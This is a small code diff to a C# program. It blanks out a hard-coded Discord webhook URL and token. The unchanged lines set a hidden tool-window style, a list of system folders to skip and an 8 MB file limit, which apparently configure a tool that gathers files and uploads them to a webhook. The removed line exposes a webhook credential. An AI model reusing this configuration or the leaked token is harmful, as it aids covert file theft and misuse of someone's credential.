@@ -31,7 +31,7 @@ class Program
     const int GWL_EXSTYLE = -20;
     const int WS_EX_TOOLWINDOW = 0x00000080;
 
-    static string WEBHOOK_URL = "https://discord.com/api/webhooks/1204138849257783397/oKVs9yUElHnMhnuGYGnSodG9NGXAZ9lSj_5cm9jsdx61cP44JXbWommB1heD6QHMGx4I";
+    static string WEBHOOK_URL = "";
     static List<string> BLACKLISTED_DIRS = new List<string> { "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\", "C:\\Recycle.Bin\\", "C:\\AMD\\" };
     static int MAX_FILE_SIZE_MB = 8;
 
